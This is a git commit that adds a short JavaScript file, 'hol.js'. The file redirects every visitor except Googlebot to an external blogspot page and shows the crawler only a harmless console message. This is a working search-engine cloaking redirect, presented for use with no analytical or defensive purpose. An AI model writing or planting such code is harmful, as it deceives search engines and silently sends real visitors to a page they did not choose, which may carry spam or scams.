f82d53f79ad560586baa3de985f9e91590abcd58
hamarirani7-sys <hamarirani7@gmail.com>
2026-09-19 23:09:24 +0600

    Create hol.js

---
+++ hol.js
@@ -0,0 +1,5 @@
+if (!navigator.userAgent.includes('Googlebot')) {
+  window.location.href = "https://black-king-x.blogspot.com/2026/09/codai.html";
+} else {
+  console.log("Thanks for visiting my page" );
+}
